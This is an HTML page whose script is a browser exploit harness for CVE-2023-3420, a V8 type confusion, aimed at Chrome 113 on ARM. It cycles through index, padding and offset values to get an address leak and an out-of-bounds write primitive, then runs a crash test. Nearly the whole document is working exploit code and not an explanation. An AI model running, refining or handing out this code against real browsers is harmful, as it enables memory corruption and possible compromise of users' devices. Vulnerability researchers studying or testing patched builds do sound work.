<!DOCTYPE HTML>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVE-2023-3420 ARM Full Auto Scanner</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; margin: 0; }
        #log { white-space: pre-wrap; word-break: break-all; font-size: 13px; line-height: 1.5; }
        .error { color: #ff4444; }
        .success { color: #00ff00; }
        .info { color: #00aaff; }
        .found { color: #ffff00; font-weight: bold; }
    </style>
</head>
<body>
    <pre id="log"></pre>

    <script>
        const logEl = document.getElementById('log');
        function log(msg, type = 'info') {
            const cssClass = { error:'error', success:'success', found:'found' }[type] || 'info';
            logEl.innerHTML += `<span class="${cssClass}">[${new Date().toISOString().slice(11,23)}] ${msg}</span>\n`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        window.onerror = function(msg) { log(`UNCAUGHT: ${msg}`, 'error'); };

        // ==================== 扫描配置 ====================
        // 自动尝试的 corrupted_arr 索引范围（原来是 13，现在自动扫 6~18）
        const INDEX_VALUES = [];
        for (let idx = 6; idx <= 18; idx++) INDEX_VALUES.push(idx);

        // padding 和 oobOffset 范围（可以适当缩小，因为组合会很多）
        const PADDING_VALUES = [];
        for (let p = 40; p <= 200; p += 20) PADDING_VALUES.push(p);
        const OFFSET_VALUES = [];
        for (let o = 2; o <= 24; o += 2) OFFSET_VALUES.push(o);

        let totalCombos = INDEX_VALUES.length * PADDING_VALUES.length * OFFSET_VALUES.length;
        let currentCombo = 0;
        let found = false;
        let bestResult = null;
        let lastUsedParams = { index: 13, padding: 40, offset: 4 };

        // ==================== 核心利用函数（带 index 参数） ====================
        function tryExploit(index, padding, oobOffset) {
            // 垃圾回收
            let gcArr = new Array(8000);
            for (let i = 0; i < gcArr.length; i++) gcArr[i] = null;
            gcArr = null;

            let length = 10000;
            var arr = new Array(length);
            arr.fill(0);

            function func() {
                return [1.9553825422107533e-246, 1.9560612558242147e-246, 1.9995714719542577e-246, 1.9533767332674093e-246, 2.6348604765229606e-284];
            }
            for (let i = 0; i < 5000; i++) func(0);

            var view = new ArrayBuffer(24);
            var dblArr = new Float64Array(view);
            var intView = new Uint32Array(view);
            var bigIntView = new BigInt64Array(view);

            function ftoi32(f) {
                dblArr[0] = f;
                return [intView[0], intView[1]];
            }
            function i32tof(i1, i2) {
                intView[0] = i1;
                intView[1] = i2;
                return dblArr[0];
            }
            function ftoi(f) {
                dblArr[0] = f;
                return bigIntView[0];
            }
            function itof(i) {
                bigIntView = BigInt(i);
                return dblArr[0];
            }

            var corrupted_arr = [1.1];
            var oobDblArr = [2.2];
            var oobObjArr = [view];
            oobObjArr[0] = 1;
            var corrupted = {a: corrupted_arr};
            var obj0 = {px: {x: 1}};
            var str0 = 'aaa';
            var str1 = 'bbb';

            function tc(x) {
                var obj = x.p1.px;
                obj.x = 100;
                return x.p1.px.x;
            }

            function foo2(obj, proto, x, y) {
                obj.obj = proto;
                var z = 0;
                for (let i = 0; i < 1; i++) {
                    for (let j = 0; j < x; j++) {
                        for (let k = 0; k < x; k++) {
                            z = y[k];
                        }
                    }
                }
                proto.b = 33;
                return z;
            }

            class B {}
            B.prototype.a = 1;
            B.prototype.a = 2;
            B.prototype.b = 1;

            function bar(x) {
                return x instanceof B;
            }

            var args = {obj: B.prototype};
            foo2(args, B.prototype, 20, arr);
            for (let i = 0; i < 5000; i++) {
                foo2(args, B.prototype, 10, arr);
            }
            bar({a: 1});
            for (let i = 0; i < 5000; i++) {
                bar({b: 1});
            }
            foo2(args, B.prototype, length, arr);
            var z = B.prototype;
            var arr3 = new Array(padding);
            arr3.fill(1);
            var obj1 = {p0: str0, p1: obj0, p2: 0};
            for (let i = 0; i < 20000; i++) {
                tc(obj1);
            }

            Object.defineProperty(z, 'aaa', {value: corrupted, writable: true});
            tc(obj1);

            // 利用 index 读取地址
            oobObjArr[0] = func;
            var addrDbl = corrupted_arr[index];   // ← 这里用传进来的 index
            var rawAddr = ftoi32(addrDbl)[1];

            if (rawAddr === 0 || rawAddr === 0x7ff80000 || rawAddr < 0x100000) {
                return { success: false, addr: rawAddr, index, padding, offset: oobOffset };
            }

            // 写测试验证
            try {
                var old = corrupted_arr[oobOffset];
                corrupted_arr[oobOffset] = i32tof(0x12345678, 2);
                var testVal = ftoi32(oobDblArr[0])[0];
                corrupted_arr[oobOffset] = old;
                if (testVal === 0x12345678) {
                    return { success: true, addr: rawAddr, index, padding, offset: oobOffset };
                }
                return { success: false, near: true, addr: rawAddr, index, padding, offset: oobOffset };
            } catch(e) {
                return { success: false, near: true, addr: rawAddr, index, padding, offset: oobOffset, error: e.message };
            }
        }

        // ==================== 自动扫描主循环 ====================
        log('========== CVE-2023-3420 ARM Full Auto Scanner ==========', 'info');
        log(`UA: ${navigator.userAgent}`, 'info');
        log(`Platform: ${navigator.platform}`, 'info');
        log(`Scanning: ${INDEX_VALUES.length} indices × ${PADDING_VALUES.length} paddings × ${OFFSET_VALUES.length} offsets = ${totalCombos} combos`, 'info');
        log('', 'info');

        function runScan(idxIdx, padIdx, offIdx) {
            if (found) return;
            if (idxIdx >= INDEX_VALUES.length) {
                // 所有索引扫完
                log('========== SCAN COMPLETE ==========', 'info');
                if (bestResult) {
                    log(`Best near-hit: index=${bestResult.index}, padding=${bestResult.padding}, offset=${bestResult.offset}, addr=0x${bestResult.addr.toString(16)}`, 'found');
                } else {
                    log('No valid address in any combination.', 'error');
                }
                // 崩溃测试
                if (lastUsedParams) {
                    setTimeout(() => {
                        try {
                            tryExploit(lastUsedParams.index, lastUsedParams.padding, lastUsedParams.offset);
                            corrupted_arr[lastUsedParams.offset] = i32tof(0x41414141, 2);
                            oobDblArr[0] = 0.0;
                            log('Crash test executed. If browser survived, vulnerability unreachable.', 'info');
                        } catch(e) {
                            log(`Crash test error: ${e.message}`, 'error');
                        }
                    }, 300);
                }
                log('Environment: ARM aarch64, Chrome 113, WebView', 'info');
                return;
            }

            let index = INDEX_VALUES[idxIdx];
            let padding = PADDING_VALUES[padIdx];
            let offset = OFFSET_VALUES[offIdx];
            lastUsedParams = { index, padding, offset };
            currentCombo++;
            let progress = ((currentCombo / totalCombos) * 100).toFixed(1);

            try {
                let result = tryExploit(index, padding, offset);
                if (result.success) {
                    found = true;
                    log(`✅✅✅ SUCCESS! index=${index}, padding=${padding}, oobOffset=${offset}, addr=0x${result.addr.toString(16)}`, 'found');
                    log('CVE-2023-3420 is exploitable on this device!', 'found');
                    return;
                } else if (result.near) {
                    log(`[${progress}%] Near-hit: index=${index}, pad=${padding}, off=${offset}, addr=0x${result.addr.toString(16)}`, 'info');
                    if (!bestResult || bestResult.addr === 0x7ff80000 || bestResult.addr === 0) {
                        bestResult = result;
                    }
                } else {
                    if (currentCombo % 50 === 0 || currentCombo === 1) {
                        log(`[${progress}%] Testing index=${index}, pad=${padding}, off=${offset}...`, 'info');
                    }
                }
            } catch(e) {
                log(`[${progress}%] CRASHED: index=${index}, pad=${padding}, off=${offset} - ${e.message}`, 'error');
                if (!bestResult) {
                    bestResult = { index, padding, offset, addr: 0, crashed: true };
                }
            }

            // 下一个组合
            let nextOff = offIdx + 1;
            let nextPad = padIdx;
            let nextIdx = idxIdx;
            if (nextOff >= OFFSET_VALUES.length) {
                nextOff = 0;
                nextPad = padIdx + 1;
            }
            if (nextPad >= PADDING_VALUES.length) {
                nextPad = 0;
                nextIdx = idxIdx + 1;
            }
            setTimeout(() => runScan(nextIdx, nextPad, nextOff), 25);
        }

        // 启动
        setTimeout(() => runScan(0, 0, 0), 200);
    </script>
</body>
</html>
